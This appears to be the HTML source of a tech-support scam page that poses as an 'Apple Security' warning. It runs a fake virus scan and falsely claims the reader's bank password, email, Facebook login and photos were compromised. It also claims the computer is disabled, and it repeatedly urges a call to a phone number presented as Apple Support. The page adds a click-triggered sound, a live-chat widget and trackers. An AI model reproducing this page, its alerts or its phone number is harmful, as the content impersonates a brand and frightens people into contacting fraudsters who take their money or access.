...
<head>
    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-L8V34Z2LQF"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag() { dataLayer.push(arguments); }
        gtag('js', new Date());

        gtag('config', 'G-L8V34Z2LQF');
    </script>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    ...
    <script src="https://stackpath.bootstrapcdn.com/boot+1-844-636-0441strap/4.5.2/js/bootstrap.min.js"
            integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV"
            crossorigin="anonymous"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">

    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-P31V82TK4L"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag() { dataLayer.push(arguments); }
        gtag('js', new Date());

        gtag('config', 'G-P31V82TK4L');
    </script>
...
<body id="mycanvas" onclick="playSound()">
  ...
  <div class="box" id="box">
    <div class="top">
      <p style="font-size: 17px; font-weight:600; font-family: Arial, Helvetica, sans-serif;">Apple Security<img
          src="minimize.jpeg" class="" style="float: right; width:115px;"></p>
    </div>

    <h4 style="position: absolute; left: 70px; top: 53px; font-weight: 300;" id="text1">Safety at a glance</h4>
    <p style="position: absolute; left: 70px; top: 100px; font-weight: 0; font-size: 13px;" id="text2"><br>Check what is
      happening to the safety and health of your device and take all necessary measures.</p>
    <div class="centerright">
      <ul>
        <li>
          ...
          <p style="top: 103px; position: absolute; font-size: 13px; color: grey;">action is required. Run a scan to
            check for <br>threats.</p>
  ...
  <div class="scan" id="scan">
    ...
    <h4 style="position: absolute; left: 70px; top: 53px; font-weight: 300;" id="text1"><img src="apple.png"
        width="25px;" style="margin-right: 10px;vertical-align: sub;">Apple Security Protection</h4>
    <p style="position: absolute; left: 70px; top: 100px; font-weight: 0; font-size: 13px;" id="text2">Device protection
      against threats.</p>
...
top: 6px;
font-weight: 500;
font-size: 19px;" id="text12"><b>+1-844-636-0441(free security)</b></h3>
    ...
    <div class="centerright">
      ...
      <ul>
        <li>
          ...
          <div class="flex"> <img src="-EBq-current.png" width="20px" height="20px;"
              style="margin-right: 10px; top: 10px; position: absolute;">
            <p style="font-weight: 400; position: absolute; left: 30px;">current threat</p>
          </div>
          ...
          <p style="font-size: 13px;" id="info">Quick scan in progress...<br>Estimated time remaining: <n id="time">
              0</b></n><br>
            <n id="amount">0</b>
              < /n> Files scanned.
          </p>
          ...
          <br>
          <p id="shx" style="font-size: 13px; color: #0063c6; display: none; cursor: pointer;">Scan Options<br> Allowed
            Threats<br> Protection History</p>
        ...
        <li>
          ...
          <div class="flex"><img src="nOxp-sett.png" height="28px" width="30px;" style="margin-right: 10px;">
            <p style="position: absolute; left: 35px;    bottom: 117px;    line-height: 18px;">Virus & threat protection
              settings </p>
          </div>
      ...
      <ul>
        ...
        <li>
          ...
          <p style="font-size: 13px; color: #0063c6; position: absolute; top: 65px; cursor: pointer;">Supplier
            management</p>
        ...
        <li>
          ...
          <p style="font-size: 13px; color: #0063c6; position: absolute; top: 152px; cursor: pointer;">Send us your
            feedback</p>
        ...
        <li>
          ...
          <p style="position: absolute; top: 220px; font-size: 13px;">View and change privacy settings on Mac<br>
            <n id="which"></b></n> devices.
          </p>

          <p style="font-size: 13px; color: #0063c6; position: absolute; top: 270px; cursor: pointer;">Privacy
            Settings<br>Privacy Dashboard<br>Privacy Statement</p>
...
margin-top: 8px; text-align: center;">Apple Security - Protection Warning</p>
          ...
          <p>Your computer has been warned that it is infected with Unknown Error code: #0x6D9. The following data was
            compromised: <br><br>
            > Email ID<br> &gt; Bank Password<br>
            > Facebook Login<br>
            > Photos and Photo Documents </p>

          <p>A Apple Security scan has detected potentially unwanted adware on this device that can steal your
            passwords, online identities, financial information, personal files, images, or documents. </p>
          <!-- <p>Please contact us immediately so that our engineers can explain the removal process over the phone. <br><br> -->

          <p> Please contact Apple Support immediately to report this threat, prevent spoofing, and unlock access to
            this device. <br><br>
            Closing this mac puts your personal information at risk and interrupts your mac registration.</p>

          <p style="padding-bottom: 0px;">Call Apple Support <strong>+1-844-636-0441(Security Support)</strong></p>
  ...
  <div id="lst" class="lst lightbox">
    <div class="ilb top">
      <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
        <span id="txtadd" class="fl title"><span class="fl ilb"><img src="apple.png" class="logo3"></span> Apple
          Defender Security Center</span>
    ...
    <div id="disclaimer">
      ...
      <span class="support">Contact Apple Support: +1-844-636-0441(Security Support)</span>
    </div>
    <div id="bottom">
        ...
        <div class="right-foot" style="text-align: center;">
          <span id="footertxt" style="font-weight: 700;"><img src="apple.png"> Apple</span><span
            style="font-weight: 700;padding-left: 5px;color: #fff;">Support contact <span
              style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;">+1-844-636-0441(Security
              Support)</span></span>
        </div>
      </div>
      <div class="col-md-12">
        <marquee width="100%" direction="left" height="100px"><small class="text-left"
            style="color: #eee;font-size: 10px;">Apple
  ...
  <div id="welcomeDiv"
    ...
    <p class="text-center" style="color: #FEFEFE;  margin-top:10px; font-size: 16px; opacity:.9; ">Do not reboot or use
      Your computer.<br>Your computer is disabled. Please, call Apple Support. <br>Access is the block security reason
      for this
...
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/57319e009c52c0bc56e39866/default';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
...
<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-4FXBGDDKSQ"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-4FXBGDDKSQ');
</script>

<!-- Hitsteps TRACKING CODE - Manual 2024-03-21 - DO NOT CHANGE -->
<script type="text/javascript">(function(){var hstc=document.createElement('script'); hstc.src='https://edgecdn.dev/code?code=a7400ed6d3f8ef9dff8b932728043756';hstc.async=true;var htssc = document.getElementsByTagName('script')[0];htssc.parentNode.insertBefore(hstc, htssc);})();
